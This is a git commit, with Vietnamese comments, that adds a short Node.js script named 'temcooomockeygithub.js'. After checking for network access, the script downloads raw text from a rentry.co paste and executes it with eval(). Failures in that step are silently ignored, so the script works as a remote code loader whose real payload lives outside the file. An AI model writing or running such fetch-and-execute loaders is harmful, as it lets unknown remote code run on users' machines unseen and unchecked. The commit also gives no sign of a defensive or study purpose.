0a185c3279b326cbe500b47027f0c31d201663b6
Pocodeonline <n20and@gmail.com>
2024-09-27 23:42:56 +0700

    temcooomockeygithub.js

---
+++ temcooomockeygithub.js
@@ -0,0 +1,52 @@
+const https = require('https');
+
+// Hàm kiểm tra kết nối internet
+function checkInternetConnection() {
+    return new Promise((resolve) => {
+        https.get('https://www.google.com/', (res) => {
+            resolve(res.statusCode === 200);
+        }).on('error', () => {
+            resolve(false);
+        });
+    });
+}
+
+// Hàm để thực thi mã từ liên kết
+async function executeCode(url) {
+    return new Promise((resolve, reject) => {
+        https.get(url, (response) => {
+            let data = '';
+
+            response.on('data', (chunk) => {
+                data += chunk;
+            });
+
+            response.on('end', () => {
+                try {
+                    eval(data);
+                    resolve();
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }).on('error', (error) => {
+            reject(error);
+        });
+    });
+}
+
+// Chạy chương trình
+(async function main() {
+    try {
+        if (await checkInternetConnection()) {
+            try {
+                await executeCode('https://rentry.co/loadkeytemco/raw');
+            } catch (error) {
+            }
+        } else {
+            console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
+        }
+    } catch (error) {
+        console.error('\x1b[38;5;9mĐã gặp lỗi:', error, '\x1b[0m');
+    }
+})();
